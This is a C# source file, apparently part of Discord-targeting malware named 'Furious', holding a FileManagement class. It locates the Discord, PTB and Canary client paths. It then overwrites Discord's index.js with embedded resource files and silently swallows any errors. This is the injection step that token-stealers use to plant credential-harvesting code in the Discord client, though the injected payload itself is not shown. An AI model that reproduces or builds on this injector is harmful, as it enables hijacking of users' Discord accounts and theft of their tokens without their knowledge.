using System.Diagnostics;
using System.IO;
using System.Reflection;

namespace Furious
{
	internal class FileManagement
	{
		internal static string PTBPath
		{
			get
			{
				return FileManagement._ptbpath;
			}
			set
			{
				FileManagement._ptbpath = value;
			}
		}
		internal static string DiscordPath
		{
			get
			{
				return FileManagement._discordpath;
			}
			set
			{
				FileManagement._discordpath = value;
			}
		}

		internal static string CanaryPath
		{
			get
			{
				return FileManagement._canarypath;
			}
			set
			{
				FileManagement._canarypath = value;
			}
		}

		internal static void CleanFile(string path)
		{
			try
			{
				using (StreamWriter streamWriter = new StreamWriter(path))
				{
					streamWriter.Write(string.Empty);
				}
			}
			catch
			{
			}
		}

		internal static void WriteDiscord(string path)
		{
			if (File.Exists(FileManagement.DiscordPath))
			{
				try
				{
					string value;
					using (StreamReader discordReader = new StreamReader(Assembly.GetExecutingAssembly().GetManifestResourceStream("Furious.Resources.index.txt")))
					{
						value = discordReader.ReadToEnd();
					}
					using (StreamWriter discordWriter = new StreamWriter(path))
					{
						discordWriter.Write(value);
					}
				}
				catch
				{
					Debug.Write("Error writing to index.js in Discord path.");
				}
			}
			if (File.Exists(FileManagement.PTBPath))
			{
				try
				{
					string value;
					using (StreamReader ptbWriter = new StreamReader(Assembly.GetExecutingAssembly().GetManifestResourceStream("Furious.Resources.ptb.txt")))
					{
						value = ptbWriter.ReadToEnd();
					}
					using (StreamWriter ptbWriter = new StreamWriter(path))
					{
						ptbWriter.Write(value);
					}
				}
				catch
				{
					Debug.Write("Error writing to index.js in DiscordPTB path.");
				}
			}
			if (File.Exists(FileManagement.CanaryPath))
			{
				try
				{
					string value;
					using (StreamReader canaryReader = new StreamReader(Assembly.GetExecutingAssembly().GetManifestResourceStream("Furious.Resources.canary.txt")))
					{
						value = canaryReader.ReadToEnd();
					}
					using (StreamWriter canaryWriter = new StreamWriter(path))
					{
						canaryWriter.Write(value);
					}
				}
				catch
				{
					Debug.Write("Error writing to index.js in Discord Canary path.");
				}
			}
		}

		internal static string _ptbpath;
		internal static string _discordpath;
		internal static string _canarypath;
	}
}